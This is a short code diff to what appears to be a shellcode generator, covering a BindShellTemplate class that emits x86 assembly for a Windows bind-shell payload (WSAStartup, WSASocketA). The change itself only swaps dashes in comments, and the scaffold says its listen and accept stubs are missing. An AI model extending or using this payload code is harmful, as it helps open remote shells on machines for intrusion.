@@ -35,7 +35,7 @@ class BindShellTemplate(PayloadTemplate):
         return "\n".join([
             "; -- Bind Shell Payload (scaffold) --",
             f"; Listen port: {config.lport}",
-            "; NOTE: bind/listen/accept stubs are not generated — add manually.",
+            "; NOTE: bind/listen/accept stubs are not generated - add manually.",
             "",
             "    ; WSAStartup(0x0202, &WSADATA)",
             *safe_lea("esi", "ebp", wsadata_off, bc),
@@ -43,7 +43,7 @@ class BindShellTemplate(PayloadTemplate):
             *safe_push_word_as_dword(0x0202, bc),
             *safe_call_mem("ebp", wsa_start_off, bc),
             "",
-            "    ; WSASocketA — create bind socket",
+            "    ; WSASocketA - create bind socket",
             "    xor  eax, eax",
             "    push eax",
             "    push eax",
